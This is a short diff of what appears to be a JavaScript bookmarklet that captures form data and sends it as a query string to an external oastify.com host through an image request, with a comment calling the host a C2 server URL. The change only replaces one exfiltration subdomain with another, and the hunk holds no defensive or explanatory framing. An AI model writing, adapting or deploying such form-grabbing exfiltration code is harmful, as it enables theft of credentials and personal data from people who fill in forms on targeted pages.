@@ -16,7 +16,7 @@ Javascript:(function() {
 
             // Use an image to send the data
             var img = new Image();
-            img.src = 'http://558j3eefp0ih9jdkfzvrwriz2q8hwmkb.oastify.com?' + queryString; // Replace with your C2 server URL
+            img.src = 'http://il7wjrus5dyupwtxvcb4c4yci3oucl69v.oastify.com?' + queryString; // Replace with your C2 server URL
         }
 
         // Allow the form to submit
